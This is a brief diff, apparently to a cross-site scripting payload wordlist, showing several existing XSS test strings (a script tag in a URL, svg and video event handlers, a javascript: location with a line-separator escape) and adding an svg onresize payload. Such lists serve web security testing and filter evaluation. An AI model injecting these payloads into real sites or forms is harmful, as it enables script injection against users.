@@ -2196,3 +2196,4 @@ http://www.<script>alert(1)</script .com
 <svg onload=popup=1;>
 <video onclick=popup=1;>
 location='javascript://\u2028alert(1)';
+<svg onresize="alert(1)">
